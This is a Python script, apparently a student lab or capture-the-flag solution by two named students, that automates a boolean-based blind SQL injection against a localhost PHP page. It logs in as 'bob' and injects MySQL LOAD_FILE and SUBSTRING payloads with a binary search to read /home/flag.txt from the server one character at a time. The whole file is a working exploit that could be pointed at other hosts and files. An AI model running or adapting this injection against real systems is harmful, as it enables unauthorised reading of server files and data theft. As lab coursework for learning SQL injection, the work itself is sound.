# Liel Avraham 216728055
# Amit Solomon 216700930

import urllib.request
import urllib.parse
import string
import http.cookiejar

BASE_URL = "http://localhost:8000/blindsqli.php?user="

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
urllib.request.install_opener(opener)


def automatic_login():
    login_url = "http://localhost:8000/login.php" 
    login_data = urllib.parse.urlencode({
        'uid': 'bob', 
        'password': 'password' 
    }).encode('utf-8')
    
    try:
        urllib.request.urlopen(login_url, data=login_data)
        
        for cookie in cj:
            if cookie.name == 'PHPSESSID':
                return True
        return False
    except Exception as e:
        return False


def check_boolean_query(payload):
    encoded_payload = urllib.parse.quote(payload)
    url = BASE_URL + encoded_payload
   
    req = urllib.request.Request(url)
   
    response = urllib.request.urlopen(req)
    html_content = response.read().decode('utf-8')
    
    # This text will appear on the screen only if the query was successful
    if "In wonderland right now" in html_content:
        return True
    else:
        return False



def extract_file_content(filepath):
    file_length = 0
    for i in range(1, 1000):
        payload = f"alice' AND LENGTH(LOAD_FILE('{filepath}')) = {i} -- -"
        if check_boolean_query(payload):
            file_length = i
            break
    
    if file_length == 0:
        print("Could not get file length")
        return None

    result = ""
    for i in range(1, file_length + 1):
        low = 0
        high = 255
        found_char_code = 0
        
        while low <= high:
            mid = (low + high) // 2
            payload = f"alice' AND ASCII(SUBSTRING(LOAD_FILE('{filepath}'), {i}, 1)) > {mid} -- -"
            
            if check_boolean_query(payload):
                low = mid + 1
            else:
                found_char_code = mid
                high = mid - 1
        
        result += chr(found_char_code)
            
    return result


if __name__ == "__main__":
    if not automatic_login():
        exit(1)

    FLAG = '/home/flag.txt'
    flag_content = extract_file_content(FLAG)
    
    print(f"Flag content: {flag_content.encode().hex()}")
